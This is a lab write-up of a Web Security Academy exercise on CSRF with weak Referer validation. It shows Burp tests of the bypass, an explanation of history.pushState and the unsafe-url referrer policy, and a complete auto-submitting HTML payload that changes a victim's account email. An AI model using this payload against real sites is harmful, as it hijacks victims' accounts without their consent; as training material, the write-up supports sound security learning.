# Lab: CSRF with broken Referer validation


test done: <br>
without referer header : DONT WORK <br>
change the referer header value : OK<br>

Test in burp (playing with the referer header) : 

=> https://MY-LAB.web-security-academy.net/                         OK<br>
=> http://MY-LAB.web-security-academy.net/                          OK<br>
=> http://toto.evil.MY-LAB.web-security-academy.net/fake            OK<br>
=> http://toto.evil/?asdf=MY-LAB.web-security-academy.net/fake      OK<br>

Actually the check for the referer header is weak: <br>

The server check only if the url of the vulnerable site is present, so we can bypass the check with : <br>

=> http://toto.req/?asdf=MY-LAB.web-security-academy.net/ <br>


Thanks to hacktricks i learn that we can change browser history with the **history** object.

With history object we can manipulate browser history entry, we can for exemple: <br>

go to the previous page with **history.back()** (if we have already visited a page) <br>
go to the next page with **history.forward()**  (if we have already visited a page and we have returned to the previous page )<br>


There is an interesting method for the history object called : pushState <br>

=> history.pushState()

state:"" => we can leave it blank <br>
unused:""=> we can leave it blank<br>
url : "?admin" => this will be push to the actual browser history in order words the actual url will change with the given url.

ex: 
```html
actual url : http://admin.com/
history.pushState("","","/?admin")
new url : http://admin.com/?admin
```
In our case : 

```html
history.pushState("", "", "/?MY-LAB.web-security-academy.net")
```

In order to add this modification in the referer header: 

Unsafe URL: Always passes the URL string as a referrer

```html
<meta name="referrer" content="unsafe-url">
```

## payload :


```html

<meta name="referrer" content="unsafe-url">
<form id="login-form" name="change-email-form" action="https://MY-LAB.web-security-academy.net/my-account/change-email" method="POST">
<input required type="email" name="email" value="yougetpwn@test.evillaugh">
</form>

<script>
let formulaire= document.getElementById("login-form");
history.pushState("", "", "/?MY-LAB.web-security-academy.net")
formulaire.submit();
</script>

```